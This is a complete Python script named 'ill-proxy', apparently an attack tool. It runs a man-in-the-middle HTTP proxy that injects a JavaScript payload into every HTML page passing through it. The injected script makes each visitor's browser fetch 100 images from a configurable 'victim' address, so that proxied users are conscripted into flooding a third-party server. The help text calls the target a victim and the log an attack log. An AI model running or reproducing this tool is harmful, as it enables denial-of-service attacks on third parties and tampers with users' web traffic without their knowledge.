import socketserver
import http.server
import socket
import threading
import sys
import datetime

# Globals
VICTIM_IP = "http://198.51.100.77"
INJECT_JS = ""
LOG_TO_FILE = False
LOG_FILE_PATH = ""

def build_injection_js():
    return f"""
<script>
  for (let i = 0; i < 100; i++) {{
    let img = new Image();
    img.src = "{VICTIM_IP}/img" + i + ".jpg";
  }}
</script>
"""

def log_event(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_message = f"[{timestamp}] {message}"
    if LOG_TO_FILE and LOG_FILE_PATH:
        try:
            with open(LOG_FILE_PATH, "a") as f:
                f.write(full_message + "\n")
        except Exception as e:
            print(f"[!] Failed to write to log: {e}")
    else:
        print(full_message)

class ProxyHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url = self.path

            if "Host" not in self.headers:
                self.send_error(400, "Bad request: No Host header")
                return

            host_header = self.headers["Host"]
            host, port = (host_header.split(":") + [80])[:2]
            port = int(port)

            log_event(f"Request to {host}:{port}{url}")

            # Connect to target
            with socket.create_connection((host, port), timeout=5) as remote:
                remote.sendall(f"GET {url} HTTP/1.1\r\n".encode())
                for header, value in self.headers.items():
                    if header.lower() != "proxy-connection":
                        remote.sendall(f"{header}: {value}\r\n".encode())
                remote.sendall(b"Connection: close\r\n\r\n")

                # Read response
                response = b""
                while True:
                    chunk = remote.recv(4096)
                    if not chunk:
                        break
                    response += chunk

            # Separate headers and body
            if b"\r\n\r\n" not in response:
                self.wfile.write(response)
                return

            header, body = response.split(b"\r\n\r\n", 1)

            if b"Content-Type: text/html" in header:
                log_event("Injecting JavaScript payload...")
                if b"</body>" in body:
                    body = body.replace(b"</body>", INJECT_JS.encode() + b"</body>")
                else:
                    body += INJECT_JS.encode()

                # Strip Content-Length
                header_lines = header.split(b"\r\n")
                header_lines = [line for line in header_lines if not line.lower().startswith(b"content-length")]
                header = b"\r\n".join(header_lines)

                response = header + b"\r\n\r\n" + body

            self.wfile.write(response)

        except Exception as e:
            log_event(f"[!] Proxy error: {e}")
            self.send_error(502, "Bad gateway")

    def log_message(self, format, *args):
        return  # Default logging disabled

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run_proxy(host="0.0.0.0", port=8080):
    server = ThreadedHTTPServer((host, port), ProxyHTTPRequestHandler)
    log_event(f"[*] ill-proxy is live at {host}:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log_event("[!] Shutting down ill-proxy.")

if __name__ == "__main__":
    args = sys.argv[1:]

    # Usage help
    if "-h" in args or "--help" in args:
        print("Usage: python ill-proxy.py [victim_ip] [log_file_path]")
        print("Example: python ill-proxy.py http://1.2.3.4 attack.log")
        sys.exit(0)

    if len(args) >= 1:
        VICTIM_IP = args[0]
    if len(args) >= 2:
        LOG_FILE_PATH = args[1]
        LOG_TO_FILE = True

    INJECT_JS = build_injection_js()
    run_proxy()
